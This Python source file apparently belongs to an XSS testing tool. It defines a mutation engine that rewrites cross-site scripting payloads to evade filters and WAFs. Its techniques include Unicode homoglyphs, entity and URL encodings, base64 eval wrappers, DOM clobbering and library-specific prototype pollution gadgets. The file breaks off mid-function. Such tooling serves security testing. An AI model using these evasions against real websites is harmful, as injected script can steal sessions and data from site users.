"""Payload mutation engine."""
from typing import Callable, List, Optional, Sequence, Union, Dict, Any
import random
import urllib.parse


class MutationEngine:
    """Apply various mutation techniques to bypass filters."""
    
    # Unicode homoglyphs mapping
    HOMOGLYPHS = {
        's': ['\u0455', '\u017f', '\u1e61'],
        'c': ['\u0441', '\u217d'],
        'r': ['\u0433', '\u1d63'],
        'i': ['\u0456', '\u0131', '\u1d62'],
        'p': ['\u0440', '\u1d56'],
        't': ['\u0442', '\u1d57'],
        'a': ['\u0430', '\u1d43'],
        'o': ['\u043e', '\u1d52'],
        'e': ['\u0435', '\u1d49'],
        'x': ['\u0445', '\u1d58'],
    }
    
    # Zero-width characters
    ZERO_WIDTH = [
        '\u200b',  # Zero-width space
        '\u200c',  # Zero-width non-joiner
        '\u200d',  # Zero-width joiner
        '\ufeff',  # Zero-width no-break space
        '\u2060',  # Word joiner
    ]
    
    # Full-width ASCII mapping
    FULL_WIDTH_MAP = {
        '<': '\uff1c',
        '>': '\uff1e',
        's': '\uff53',
        'c': '\uff43',
        'r': '\uff52',
        'i': '\uff49',
        'p': '\uff50',
        't': '\uff54',
        'a': '\uff41',
        'o': '\uff4f',
        'e': '\uff45',
        'x': '\uff58',
    }

    @staticmethod
    def _split_protected(
        payload: str,
        protected_tokens: Optional[Sequence[str]] = None
    ) -> List[tuple[str, bool]]:
        """Split payload into mutable and protected chunks."""
        tokens = [token for token in set(protected_tokens or []) if token]
        if not tokens:
            return [(payload, False)]

        spans = []
        for token in sorted(tokens, key=len, reverse=True):
            start = 0
            while True:
                idx = payload.find(token, start)
                if idx == -1:
                    break
                end = idx + len(token)
                if not any(idx < existing_end and end > existing_start for existing_start, existing_end in spans):
                    spans.append((idx, end))
                start = end

        if not spans:
            return [(payload, False)]

        parts: List[tuple[str, bool]] = []
        cursor = 0
        for start, end in sorted(spans):
            if start > cursor:
                parts.append((payload[cursor:start], False))
            parts.append((payload[start:end], True))
            cursor = end

        if cursor < len(payload):
            parts.append((payload[cursor:], False))

        return parts

    @staticmethod
    def _apply_to_unprotected(
        payload: str,
        protected_tokens: Optional[Sequence[str]],
        mutator: Callable[[str], str]
    ) -> str:
        """Apply a string mutator without changing protected oracle tokens."""
        parts = MutationEngine._split_protected(payload, protected_tokens)
        return ''.join(part if protected else mutator(part) for part, protected in parts)

    @staticmethod
    def _expand_unprotected(
        payload: str,
        protected_tokens: Optional[Sequence[str]],
        mutator: Callable[[str], Union[str, List[str]]]
    ) -> List[str]:
        """Build variants by mutating one unprotected chunk at a time."""
        parts = MutationEngine._split_protected(payload, protected_tokens)
        variants = []

        for index, (part, protected) in enumerate(parts):
            if protected or not part:
                continue

            mutated_values = mutator(part)
            if isinstance(mutated_values, str):
                mutated_values = [mutated_values]

            for mutated in mutated_values:
                if mutated == part:
                    continue
                new_parts = [existing_part for existing_part, _ in parts]
                new_parts[index] = mutated
                variants.append(''.join(new_parts))

        return variants if variants else [payload]
    
    @staticmethod
    def apply_zero_width(payload: str, count: int = 1) -> str:
        """Insert zero-width characters into payload.
        
        Args:
            payload: Original payload
            count: Number of insertions
            
        Returns:
            Mutated payload
        """
        if not payload:
            return payload
        
        result = list(payload)
        positions = random.sample(range(len(result)), min(count, len(result)))
        
        for pos in sorted(positions, reverse=True):
            zero_char = random.choice(MutationEngine.ZERO_WIDTH)
            result.insert(pos, zero_char)
        
        return ''.join(result)
    
    @staticmethod
    def apply_homoglyphs(payload: str, probability: float = 0.3) -> str:
        """Replace characters with Unicode homoglyphs.
        
        Args:
            payload: Original payload
            probability: Probability of replacing each character
            
        Returns:
            Mutated payload
        """
        result = []
        for char in payload:
            if char.lower() in MutationEngine.HOMOGLYPHS and random.random() < probability:
                homoglyphs = MutationEngine.HOMOGLYPHS[char.lower()]
                replacement = random.choice(homoglyphs)
                # Preserve case
                if char.isupper():
                    replacement = replacement.upper() if replacement.islower() else replacement
                result.append(replacement)
            else:
                result.append(char)
        return ''.join(result)
    
    @staticmethod
    def apply_full_width(payload: str, probability: float = 0.5) -> str:
        """Replace ASCII with full-width characters.
        
        Args:
            payload: Original payload
            probability: Probability of replacing each character
            
        Returns:
            Mutated payload
        """
        result = []
        for char in payload:
            if char in MutationEngine.FULL_WIDTH_MAP and random.random() < probability:
                result.append(MutationEngine.FULL_WIDTH_MAP[char])
            else:
                result.append(char)
        return ''.join(result)
    
    @staticmethod
    def apply_html_entities(payload: str, probability: float = 0.5) -> str:
        """Encode characters as HTML entities.
        
        Args:
            payload: Original payload
            probability: Probability of encoding each character
            
        Returns:
            Mutated payload
        """
        entity_map = {
            '<': '&lt;',
            '>': '&gt;',
            '"': '&quot;',
            "'": '&#x27;',
            '&': '&amp;',
            '/': '&#x2F;',
        }
        
        result = []
        for char in payload:
            if char in entity_map and random.random() < probability:
                result.append(entity_map[char])
            else:
                result.append(char)
        return ''.join(result)
    
    @staticmethod
    def apply_url_encoding(payload: str, probability: float = 0.3) -> str:
        """URL encode characters.
        
        Args:
            payload: Original payload
            probability: Probability of encoding each character
            
        Returns:
            Mutated payload
        """
        result = []
        for char in payload:
            if random.random() < probability and char not in ['-', '_', '.', '~']:
                result.append(urllib.parse.quote(char))
            else:
                result.append(char)
        return ''.join(result)
        
    @staticmethod
    def apply_double_url_encoding(payload: str, probability: float = 0.3) -> str:
        """Double URL encode characters to bypass recursive decoders.
        
        Args:
            payload: Original payload
            probability: Probability of encoding each character
            
        Returns:
            Mutated payload
        """
        result = []
        for char in payload:
            if random.random() < probability and char not in ['-', '_', '.', '~']:
                first_encode = urllib.parse.quote(char)
                result.append(urllib.parse.quote(first_encode))
            else:
                result.append(char)
        return ''.join(result)
        
    @staticmethod
    def apply_tag_nesting(payload: str) -> str:
        """Nest keywords to bypass recursive removal filters (e.g., <scr<script>ipt>).
        
        Args:
            payload: Original payload
            
        Returns:
            Mutated payload
        """
        keywords = ['script', 'iframe', 'object', 'embed']
        for keyword in keywords:
            if keyword in payload.lower():
                # Split and nest
                midpoint = len(keyword) // 2
                nested = keyword[:midpoint] + f"<{keyword}>" + keyword[midpoint:]
                payload = payload.replace(keyword, nested)
                payload = payload.replace(keyword.upper(), nested.upper())
        return payload

    @staticmethod
    def apply_tag_case_variants(payload: str) -> List[str]:
        """Create deterministic case variants for HTML tag names."""
        import re

        def alternate_case(value: str) -> str:
            return ''.join(char.upper() if index % 2 else char.lower() for index, char in enumerate(value))

        variants = []
        mixed_tags = re.sub(
            r'(</?)([a-z][a-z0-9:-]*)',
            lambda match: match.group(1) + alternate_case(match.group(2)),
            payload,
            flags=re.IGNORECASE
        )
        if mixed_tags != payload:
            variants.append(mixed_tags)

        upper_tags = re.sub(
            r'(</?)([a-z][a-z0-9:-]*)',
            lambda match: match.group(1) + match.group(2).upper(),
            payload,
            flags=re.IGNORECASE
        )
        if upper_tags != payload:
            variants.append(upper_tags)

        return variants if variants else [payload]

    @staticmethod
    def apply_event_handler_separator_variants(payload: str) -> List[str]:
        """Vary spacing around event-handler assignment operators."""
        import re

        variants = []
        separators = ['\t', '\n', '\r', '\x0c', '&#x09;', '&#10;', '&#13;']
        for separator in separators:
            variant = re.sub(r'\b(on[a-z0-9_-]+)\s*=', rf'\1{separator}=', payload, flags=re.IGNORECASE)
            if variant != payload:
                variants.append(variant)

        return variants if variants else [payload]

    @staticmethod
    def apply_protocol_split_variants(payload: str) -> List[str]:
        """Generate javascript: and data: URL parser variants."""
        import re

        variants = []
        protocol_variants = [
            'java\tscript:',
            'java\nscript:',
            'java\rscript:',
            'java&#x09;script:',
            'java&#10;script:',
            'java&#13;script:',
            'javascript&colon;',
            'javascript&#x3a;',
            'javascript&#58;',
        ]

        if re.search(r'javascript\s*:', payload, flags=re.IGNORECASE):
            for replacement in protocol_variants:
                variant = re.sub(r'javascript\s*:', replacement, payload, flags=re.IGNORECASE)
                if variant != payload:
                    variants.append(variant)

        if re.search(r'data:text/html', payload, flags=re.IGNORECASE):
            for replacement in ['data:text/html;charset=utf-8', 'data:text/html;fragment=x']:
                variant = re.sub(r'data:text/html', replacement, payload, flags=re.IGNORECASE)
                if variant != payload:
                    variants.append(variant)

        return variants if variants else [payload]
    
    @staticmethod
    def apply_keyword_splitting(payload: str) -> List[str]:
        """Split keywords to bypass filters.
        
        Args:
            payload: Original payload
            
        Returns:
            List of mutated payloads with split keywords
        """
        mutations = []
        
        # Split common keywords
        splits = {
            'script': ['sc' + '\u200b' + 'ript', 'sc' + '\u200c' + 'ript', 'sc' + '\u200d' + 'ript'],
            'onerror': ['on' + '\u200b' + 'error', 'on' + '\u200c' + 'error'],
            'onload': ['on' + '\u200b' + 'load', 'on' + '\u200c' + 'load'],
            'onclick': ['on' + '\u200b' + 'click', 'on' + '\u200c' + 'click'],
            'javascript': ['java' + '\u200b' + 'script', 'java' + '\u200c' + 'script'],
            'alert': ['al' + '\u200b' + 'ert', 'al' + '\u200c' + 'ert'],
        }
        
        for keyword, variants in splits.items():
            if keyword in payload.lower():
                for variant in variants:
                    mutated = payload.replace(keyword, variant)
                    mutated = mutated.replace(keyword.capitalize(), variant)
                    mutated = mutated.replace(keyword.upper(), variant.upper())
                    mutations.append(mutated)
        
        return mutations if mutations else [payload]
    
    @staticmethod
    def apply_recursive_nesting(payload: str) -> List[str]:
        """Nest keywords to bypass non-recursive removal filters (e.g. javascjavascript:ript:)."""
        mutations = []
        keywords = ['script', 'onerror', 'onload', 'onclick', 'javascript:', 'srcdoc', 'expression']
        for keyword in keywords:
            if keyword in payload.lower():
                mid = len(keyword) // 2
                variant = keyword[:mid] + keyword + keyword[mid:]
                mutated = payload.replace(keyword, variant)
                mutated = mutated.replace(keyword.upper(), variant.upper())
                mutated = mutated.replace(keyword.capitalize(), variant.capitalize())
                if mutated != payload:
                    mutations.append(mutated)
        return mutations if mutations else [payload]
    
    @staticmethod
    def apply_mixed_case(payload: str) -> str:
        """Apply mixed case to payload.
        
        Args:
            payload: Original payload
            
        Returns:
            Mutated payload with mixed case
        """
        result = []
        for i, char in enumerate(payload):
            if char.isalpha():
                # Randomly change case
                if random.random() < 0.5:
                    result.append(char.swapcase())
                else:
                    result.append(char)
            else:
                result.append(char)
        return ''.join(result)

    @staticmethod
    def apply_unicode_escapes(payload: str) -> str:
        """Replace alphabetic characters in scripts with JavaScript Unicode escape sequences.
        
        Example: alert -> \u0061\u006c\u0065\u0072\u0074
        """
        import re
        def repl(match):
            word = match.group(0)
            if word.lower() in ['alert', 'eval', 'function', 'constructor', 'setTimeout', 'setInterval', 'onload', 'onerror', 'onfocus', 'onclick']:
                return "".join(f"\\u{ord(c):04x}" for c in word)
            return word
        return re.sub(r'\b[a-zA-Z]+\b', repl, payload)

    @staticmethod
    def apply_hex_escapes(payload: str) -> str:
        """Replace alphabetic characters in script strings with hex escape sequences.
        
        Example: alert -> \x61\x6c\x65\x72\x74
        """
        import re
        def repl(match):
            word = match.group(0)
            if word.lower() in ['alert', 'eval', 'function', 'constructor', 'setTimeout', 'setInterval', 'onload', 'onerror', 'onfocus', 'onclick']:
                return "".join(f"\\x{ord(c):02x}" for c in word)
            return word
        return re.sub(r'\b[a-zA-Z]+\b', repl, payload)

    @staticmethod
    def apply_string_hex_escapes(payload: str) -> str:
        """Replace string literals in Javascript with hexadecimal escape sequences.
        
        Example: 'hello' -> '\x68\x65\x6c\x6c\x6f'
        """
        import re
        def repl(match):
            content = match.group(1)
            if not content:
                return match.group(0)
            hex_seq = "".join(f"\\x{ord(c):02x}" for c in content)
            return f"'{hex_seq}'"
        return re.sub(r'["\']([^"\']*)["\']', repl, payload)

    @staticmethod
    def apply_string_octal_escapes(payload: str) -> str:
        """Replace string literals in Javascript with octal escape sequences.
        
        Example: 'hello' -> '\150\145\154\154\157'
        """
        import re
        def repl(match):
            content = match.group(1)
            if not content:
                return match.group(0)
            oct_seq = "".join(f"\\{oct(ord(c))[2:]}" for c in content)
            return f"'{oct_seq}'"
        return re.sub(r'["\']([^"\']*)["\']', repl, payload)

    @staticmethod
    def apply_string_from_char_code(payload: str) -> str:
        """Replace string literals in Javascript with String.fromCharCode calls.
        
        Example: 'hello' -> String.fromCharCode(104,101,108,108,111)
        """
        import re
        def repl(match):
            content = match.group(1)
            if not content:
                return match.group(0)
            codes = ",".join(str(ord(c)) for c in content)
            return f"String.fromCharCode({codes})"
        # Match single or double quoted strings
        return re.sub(r'["\']([^"\']*)["\']', repl, payload)

    @staticmethod
    def apply_alternating_escapes(payload: str) -> str:
        """Replace alphabetic characters in sensitive JavaScript words or strings
        with alternating \\xXX and \\u{XX} escape sequences.
        """
        import re

        def to_alternating(txt):
            res = []
            for i, c in enumerate(txt):
                if not c.isalpha():
                    res.append(c)
                    continue
                if i % 2 == 0:
                    res.append(f"\\x{ord(c):02x}")
                else:
                    res.append(f"\\u{{{ord(c):x}}}")
            return "".join(res)

        def synthesize_word(word: str) -> str:
            parts = []
            for c in word:
                if 'a' <= c <= 'z':
                    parts.append(f"{ord(c) - 87}..toString(36)")
                elif 'A' <= c <= 'Z':
                    parts.append(f"({ord(c.lower()) - 87}..toString(36))['toUpperCase']()")
                elif '0' <= c <= '9':
                    parts.append(f"{c}")
                elif c == '_':
                    parts.append("String['fromCharCode'](95)")
                else:
                    parts.append(f"String['fromCharCode']({ord(c)})")
            return "+".join(parts)

        def obfuscate_js(code: str) -> str:
            # 1. Extract existing string literals to avoid modifying dots/keywords inside them
            placeholders = {}
            str_counter = 0
            string_pattern = r'(?:"((?:[^"\\]|\\.)*)"|\'((?:[^\'\\]|\\.)*)\')'

            def str_repl(match):
                nonlocal str_counter
                content = match.group(1) or match.group(2) or ""
                obfuscated = to_alternating(content)
                placeholder = f"__JS_STR_PLACEHOLDER_{str_counter}__"
                placeholders[placeholder] = f"'{obfuscated}'"
                str_counter += 1
                return placeholder

            code = re.sub(string_pattern, str_repl, code)

            # 2. Replace standalone global keywords with base-36 synthesized quote-free brackets
            replacements = {
                r'(?<!\.)\bdocument\b': f'self[{synthesize_word("document")}]',
                r'(?<!\.)\bwindow\b': 'self',
                r'(?<!\.)\blocation\b': f'self[{synthesize_word("location")}]',
                r'(?<!\.)\b__XSS__\b': f'self[{synthesize_word("__XSS__")}]',
            }
            for pattern, repl in replacements.items():
                code = re.sub(pattern, repl, code)

            # 3. Convert dot property accesses to base-36 synthesized brackets
            def repl_dot(match):
                prop_name = match.group(1)
                return f"[{synthesize_word(prop_name)}]"
            code = re.sub(r'\.([a-zA-Z_][a-zA-Z0-9_]*)', repl_dot, code)

            # 4. Match and obfuscate the newly created bracket property strings
            def repl_bracket_str(match):
                content = match.group(1) or match.group(2) or ""
                return f"'{to_alternating(content)}'"

            code = re.sub(string_pattern, repl_bracket_str, code)

            # 5. Restore the original string literals
            for placeholder, original in placeholders.items():
                code = code.replace(placeholder, original)

            return code

        modified = False

        # A. Script tags
        def repl_script(match):
            nonlocal modified
            tag_open = match.group(1)
            code = match.group(2)
            modified = True
            return f"{tag_open}{obfuscate_js(code)}</script>"
        payload = re.sub(r'(<script[^>]*>)(.*?)</script>', repl_script, payload, flags=re.IGNORECASE | re.DOTALL)

        # B. Event handlers
        def repl_event(match):
            nonlocal modified
            attr = match.group(1)
            quote = match.group(2)
            code = match.group(3)
            modified = True
            return f'{attr}={quote}{obfuscate_js(code)}{quote}'
        payload = re.sub(r'(\bon[a-zA-Z]+)\s*=\s*(["\'])(.*?)\2', repl_event, payload, flags=re.IGNORECASE)

        # C. Javascript URLs in HTML tags
        def repl_js_url(match):
            nonlocal modified
            tag_prefix = match.group(1)
            quote = match.group(2)
            prefix = match.group(3)
            code = match.group(4)
            modified = True
            return f'{tag_prefix}={quote}{prefix}{obfuscate_js(code)}{quote}'
        payload = re.sub(r'(<[^>]*\b(?:href|src))\s*=\s*(["\'])(javascript\s*:\s*)(.*?)\2', repl_js_url, payload, flags=re.IGNORECASE)

        # D. Fallback to entire payload
        if not modified:
            payload = obfuscate_js(payload)

        return payload

    @staticmethod
    def apply_dom_clobbering(payload: str) -> List[str]:
        """Wrap payload inside DOM Clobbering configurations to hijack global settings."""
        action = payload
        js_payload = action
        if "javascript:" in js_payload.lower():
            js_payload = js_payload.replace("javascript:", "")
            
        variants = []
        config_names = ["config", "authConfig", "settings", "options", "setup", "env", "app"]
        property_names = ["url", "src", "path", "href", "endpoint", "callback", "redirect"]
        
        # 1. Base forms (legacy/standard clobbering)
        for name in config_names[:3]:
            variants.append(f'<form name="{name}" data-next="javascript:{js_payload}"></form>')
            variants.append(f'<form name="{name}"><input name="dataset" value="{{\\"next\\":\\"javascript:{js_payload}\\"}}"></form>')
            
        # 2. Linked/HTMLCollection Clobbering (Crucial for nested lookups: window.config.url)
        for name in config_names[:3]:
            for prop in property_names[:3]:
                # Dual anchors mapping property -> string representation
                variants.append(f'<a id="{name}"></a><a id="{name}" name="{prop}" href="javascript:{js_payload}"></a>')
                variants.append(f'<form id="{name}"><a name="{prop}" href="javascript:{js_payload}"></a></form>')
                
                # HTML Entity encoded variants to bypass WAF / strict input filtering on keywords (like 'javascript', parentheses, etc.)
                raw_href = f"javascript:{js_payload}"
                encoded_href = "".join(f"&#{ord(c)};" for c in raw_href)
                variants.append(f'<a id="{name}"></a><a id="{name}" name="{prop}" href="{encoded_href}"></a>')
                variants.append(f'<form id="{name}"><a name="{prop}" href="{encoded_href}"></a></form>')
                
        return variants

    @staticmethod
    def apply_prototype_pollution(payload: str) -> List[str]:
        """Wrap payload into prototype pollution formats targeting common gadgets (e.g. html, onload, src)."""
        action = payload
        js_payload = action
        if "javascript:" in js_payload.lower():
            js_payload = js_payload.replace("javascript:", "")
            
        variants = []
        gadgets = ["html", "onload", "src", "url", "href", "sourceURL", "content", "jquery"]
        
        for g in gadgets:
            # HTML context gadgets (retains action as-is)
            if g in ["html", "content"]:
                variants.append(f"__proto__.{g}={action}")
                variants.append(f"__proto__[{g}]={action}")
                variants.append(f"constructor.prototype.{g}={action}")
                variants.append(f"constructor[prototype][{g}]={action}")
            # Script/URL context gadgets (uses javascript: action)
            else:
                variants.append(f"__proto__.{g}=javascript:{js_payload}")
                variants.append(f"__proto__[{g}]=javascript:{js_payload}")
                variants.append(f"constructor.prototype.{g}=javascript:{js_payload}")
                variants.append(f"constructor[prototype][{g}]=javascript:{js_payload}")
                
        return variants

    @staticmethod
    def apply_gadget_pollution(payload: str, tech_stack: Dict[str, Any]) -> List[str]:
        """Generate library-specific prototype pollution gadgets based on the detected tech stack."""
        action = payload
        if "javascript:" in action.lower():
            action = action.replace("javascript:", "")
            
        variants = []
        
        # 1. jQuery Gadgets
        if any(k in tech_stack for k in ['jquery', 'jquery_alt']):
            # jQuery.ajax() gadgets
            variants.append(f"__proto__[url]=javascript:{action}")
            variants.append(f"__proto__[src]=javascript:{action}")
            variants.append(f"__proto__[dataType]=script")
            # jQuery HTML method gadgets
            variants.append(f"__proto__[html]={action}")
            variants.append(f"__proto__[div][0]=1")
            variants.append(f"__proto__[div][1]=<img src=x onerror={action}>")
            
        # 2. Bootstrap Gadgets (Tooltip/Popover XSS)
        if 'bootstrap' in tech_stack:
            variants.append(f"__proto__[container]=body")
            variants.append(f"__proto__[html]=true")
            variants.append(f"__proto__[content]=<img src=x onerror={action}>")
            variants.append(f"__proto__[template]=<div class=tooltip><div class=tooltip-inner></div></div>")
            
        # 3. Angular Gadgets
        if 'angular' in tech_stack:
            variants.append(f"__proto__[onload]=javascript:{action}")
            variants.append(f"__proto__[src]=javascript:{action}")
            
        # 4. Fallback/Common Gadgets (Lodash, Webpack, etc.)
        variants.append(f"__proto__[sourceURL]=%0A{action}")
        variants.append(f"__proto__[sourceURL]=javascript:{action}")
        variants.append(f"__proto__[publicPath]=javascript:{action}")
        
        return variants

    @staticmethod
    def apply_slash_obfuscation(payload: str) -> str:
        """Insert slashes inside HTML tags (e.g. <img src=x> -> <img/src=x>)."""
        import re
        # Find tag names followed by space
        payload = re.sub(r'<([a-zA-Z0-9]+)\s+', r'<\1/', payload)
        # Find attributes followed by space
        payload = re.sub(r'\s+([a-zA-Z0-9_-]+=)', r'/\1', payload)
        return payload

    @staticmethod
    def apply_base64_eval(payload: str) -> str:
        """Encode executable JS code blocks inside payload using base64.
        
        Example: onload="alert(1)" -> onload="eval(atob('YWxlcnQoMSk='))"
        """
        import re
        import base64
        
        def repl_attr(match):
            attr = match.group(1)
            code = match.group(2)
            if code:
                b64_code = base64.b64encode(code.encode()).decode()
                return f'{attr}="eval(atob(\'{b64_code}\'))"'
            return match.group(0)
            
        payload = re.sub(r'(\bon[a-zA-Z]+)\s*=\s*["\']([^"\']+)["\']', repl_attr, payload)
        
        def repl_script(match):
            code = match.group(1)
            if code:
                b64_code = base64.b64encode(code.encode()).decode()
                return f"<script>eval(atob('{b64_code}'))</script>"
            return match.group(0)
            
        payload = re.sub(r'<script>(.*?)</script>', repl_script, payload, flags=re.DOTALL)
        return payload

    @staticmethod
    def apply_string_concatenation(payload: str) -> str:
        """Split strings into concatenated segments.
        
        Example: 'onerror' -> 'on'+'er'+'ror'
        """
        import re
        def repl(match):
            quote = match.group(0)[0]
            content = match.group(1)
            if not content or len(content) <= 3:
                return match.group(0)
            chunks = [content[i:i+3] for i in range(0, len(content), 3)]
            return "+".join(f"{quote}{c}{quote}" for c in chunks)
            
        return re.sub(r'["\']([^"\']*)["\']', repl, payload)

    @staticmethod
    def apply_array_join(payload: str) -> str:
        """Replace function identifiers with window array joins.
        
        Example: alert(1) -> window[['al','ert'].join('')](1)
        """
        import re
        keywords = ['alert', 'eval', 'setTimeout', 'setInterval', 'constructor']
        for kw in keywords:
            if kw in payload:
                mid = len(kw) // 2
                split_kw = f"['{kw[:mid]}','{kw[mid:]}'].join('')"
                payload = re.sub(rf'\b{kw}\s*\(', f"window[{split_kw}](", payload)
        return payload

    @staticmethod
    def apply_hex_entities(payload: str) -> str:
        """Encode special characters as hex HTML entities."""
        entity_map = {
            '<': '&#x3C;',
            '>': '&#x3E;',
            '"': '&#x22;',
            "'": '&#x27;',
            '/': '&#x2F;',
        }
        for char, entity in entity_map.items():
            payload = payload.replace(char, entity)
        return payload

    @staticmethod
    def apply_octal_escapes(payload: str) -> str:
        """Replace alphabetic characters in scripts with octal escape sequences.
        
        Example: alert -> \141\154\145\162\164
        """
        import re
        def repl(match):
            word = match.group(0)
            if word.lower() in ['alert', 'eval', 'function', 'constructor', 'settimeout', 'setinterval', 'onload', 'onerror', 'onfocus', 'onclick']:
                return "".join(f"\\{oct(ord(c))[2:]}" for c in word)
            return word
        return re.sub(r'\b[a-zA-Z]+\b', repl, payload, flags=re.IGNORECASE)

    @staticmethod
    def apply_double_html_entities(payload: str) -> str:
        """Double encode HTML entities to bypass multi-stage decoding filters."""
        entity_map = {
            '<': '&amp;lt;',
            '>': '&amp;gt;',
            '"': '&amp;quot;',
            "'": '&amp;#x27;',
            '/': '&amp;#x2F;',
        }
        for char, entity in entity_map.items():
            payload = payload.replace(char, entity)
        return payload

    @staticmethod
    def apply_decimal_entities(payload: str) -> str:
        """Convert special characters to decimal HTML entities.
        
        Example: < -> &#60;
        """
        entity_map = {
            '<': '&#60;',
            '>': '&#62;',
            '"': '&#34;',
            "'": '&#39;',
            '/': '&#47;',
        }
        for char, entity in entity_map.items():
            payload = payload.replace(char, entity)
        return payload

    @staticmethod
    def apply_html5_named_entities(payload: str) -> str:
        """Use HTML5 specific named entities for obfuscating parameters."""
        entity_map = {
            ':': '&colon;',
            '=': '&equals;',
            '(': '&lpar;',
            ')': '&rpar;',
        }
        for char, entity in entity_map.items():
            payload = payload.replace(char, entity)
        return payload

    @staticmethod
    def apply_semicolonless_entities(payload: str) -> str:
        """Use numeric character references without semicolons where parsers allow them."""
        entity_map = {
            '<': '&#60',
            '>': '&#62',
            '"': '&#34',
            "'": '&#39',
            '/': '&#47',
            ':': '&#58',
            '=': '&#61',
        }
        for char, entity in entity_map.items():
            payload = payload.replace(char, entity)
        return payload

    @staticmethod
    def apply_entity_whitespace_variants(payload: str) -> List[str]:
        """Replace literal spaces with HTML whitespace references."""
        if ' ' not in payload:
            return [payload]

        variants = []
        for replacement in ['&#x09;', '&#10;', '&#13;', '&#x0c;', '\t', '\n', '\r', '\x0c']:
            variant = payload.replace(' ', replacement)
            if variant != payload:
                variants.append(variant)

        return variants

    @staticmethod
    def apply_data_uri_obfuscation(payload: str) -> str:
        """Wrap payload script tags or event handlers in a Base64-encoded iframe src or object data URI."""
        import re
        import base64
        
        def repl(match):
            script_block = match.group(0)
            b64_data = base64.b64encode(script_block.encode()).decode()
            return f'<iframe src="data:text/html;base64,{b64_data}"></iframe>'
            
        return re.sub(r'<script>.*?</script>', repl, payload, flags=re.DOTALL | re.IGNORECASE)

    @staticmethod
    def apply_iframe_srcdoc_wrapper(payload: str) -> str:
        """Wrap markup payloads in srcdoc to exercise nested parser contexts."""
        if '<' not in payload or '>' not in payload:
            return payload

        import html
        escaped = html.escape(payload, quote=True)
        return f'<iframe srcdoc="{escaped}"></iframe>'

    @staticmethod
    def apply_svg_foreignobject_wrapper(payload: str) -> str:
        """Wrap HTML payloads through SVG foreignObject reparsing."""
        if '<' not in payload or '>' not in payload:
            return payload
        return f'<svg><foreignObject>{payload}</foreignObject></svg>'

    @staticmethod
    def apply_style_animation_wrapper(payload: str) -> str:
        """Turn direct payloads into animation-triggered HTML event variants."""
        if '__XSS__' not in payload:
            return payload
        return f'<svg><style>@keyframes x{{}}</style><rect style="animation-name:x" onanimationstart="{payload}"/></svg>'

    @staticmethod
    def apply_comment_obfuscation(payload: str) -> str:
        """Insert multi-line comments /**/ inside JavaScript execution spaces or spaces."""
        import re
        payload = re.sub(r'\(([^)]*)\)', r'/**/(/**/\1/**/)', payload)
        payload = re.sub(r'\s+', r'/**/', payload)
        return payload

    @staticmethod
    def apply_js_constructor_obfuscation(payload: str) -> str:
        """Replace standard function execution with Constructor invocation chain."""
        import re
        keywords = ['alert', 'eval', 'settimeout', 'setinterval']
        for kw in keywords:
            pattern = rf'\b{kw}\s*\((.*?)\)'
            def repl(match):
                arg = match.group(1)
                return f"[].constructor.constructor({arg})()"
            payload = re.sub(pattern, repl, payload, flags=re.IGNORECASE)
        return payload

    @staticmethod
    def apply_alternative_whitespace(payload: str) -> str:
        """Replace spaces with alternative URL-decodable whitespaces (tabs, vertical tabs, newlines)."""
        whitespaces = ['\t', '\n', '\r', '\x0b', '\x0c']
        result = []
        for char in payload:
            if char == ' ':
                result.append(random.choice(whitespaces))
            else:
                result.append(char)
        return ''.join(result)

    @staticmethod
    def apply_url_hex_upper_encoding(payload: str) -> str:
        """URL encode using uppercase hexadecimal sequences."""
        result = []
        for char in payload:
            if char.isalnum():
                result.append(f"%{ord(char):02X}")
            else:
                result.append(char)
        return ''.join(result)

    @staticmethod
    def apply_padded_decimal_entities(payload: str) -> str:
        """Convert special characters to padded decimal HTML entities.
        
        Example: < -> &#0000060;
        """
        entity_map = {
            '<': '&#0000060;',
            '>': '&#0000062;',
            '"': '&#0000034;',
            "'": '&#0000039;',
            '/': '&#0000047;',
        }
        for char, entity in entity_map.items():
            payload = payload.replace(char, entity)
        return payload

    @staticmethod
    def apply_padded_hex_entities(payload: str) -> str:
        """Convert special characters to padded hex HTML entities.
        
        Example: < -> &#x000003C;
        """
        entity_map = {
            '<': '&#x000003C;',
            '>': '&#x000003E;',
            '"': '&#x0000022;',
            "'": '&#x0000027;',
            '/': '&#x000002F;',
        }
        for char, entity in entity_map.items():
            payload = payload.replace(char, entity)
        return payload

    @staticmethod
    def apply_padded_unicode_escapes(payload: str) -> str:
        r"""Replace alphabetic characters in scripts with ES6 braced padded Unicode escape sequences.
        
        Example: alert -> \u{000061}\u{00006c}...
        """
        import re
        def repl(match):
            word = match.group(0)
            if word.lower() in ['alert', 'eval', 'function', 'constructor', 'settimeout', 'setinterval', 'onload', 'onerror', 'onfocus', 'onclick']:
                return "".join(f"\\u{{0000{ord(c):02x}}}" for c in word)
            return word
        return re.sub(r'\b[a-zA-Z]+\b', repl, payload, flags=re.IGNORECASE)

    @staticmethod
    def apply_location_hash_obfuscation(payload: str) -> str:
        """Wrap payload by moving JS code execution into location.hash fragment."""
        import re
        def repl(match):
            code = match.group(1)
            if code:
                import urllib.parse
                encoded_code = urllib.parse.quote(code)
                return f"<script>eval(decodeURIComponent(location.hash.slice(1)))</script>#{encoded_code}"
            return match.group(0)
        return re.sub(r'<script>(.*?)</script>', repl, payload, flags=re.DOTALL | re.IGNORECASE)

    @staticmethod
    def apply_js_function_constructor(payload: str) -> str:
        """Replace standard function execution with ES6 Function template literals."""
        import re
        keywords = ['alert', 'eval', 'settimeout', 'setinterval']
        for kw in keywords:
            pattern = rf'\b{kw}\s*\((.*?)\)'
            def repl(match):
                arg = match.group(1)
                sanitized_arg = arg.replace('"', '').replace("'", "")
                return f"Function`{kw}\\x28{sanitized_arg}\\x29```"
            payload = re.sub(pattern, repl, payload, flags=re.IGNORECASE)
        return payload

    @staticmethod
    def apply_oracle_call_wrappers(payload: str) -> List[str]:
        """Wrap direct __XSS__ calls through alternate JavaScript dispatch paths."""
        import json
        import re

        variants = []
        pattern = r'__XSS__\s*\(([^)]*)\)'

        for match in re.finditer(pattern, payload):
            call = match.group(0)
            args = match.group(1)
            call_as_string = json.dumps(call)
            replacements = [
                f"globalThis['__XSS__']({args})",
                f"(0,__XSS__)({args})",
                f"window?.__XSS__?.({args})",
                f"queueMicrotask(()=>{call})",
                f"Promise.resolve().then(()=>{call})",
                f"setTimeout({call_as_string},0)",
                f"[].filter.constructor({call_as_string})()",
            ]

            for replacement in replacements:
                variant = payload[:match.start()] + replacement + payload[match.end():]
                if variant != payload:
                    variants.append(variant)

        return variants if variants else [payload]

    @staticmethod
    def apply_template_tag_calls(payload: str) -> List[str]:
        """Convert function-call syntax to template-tag syntax."""
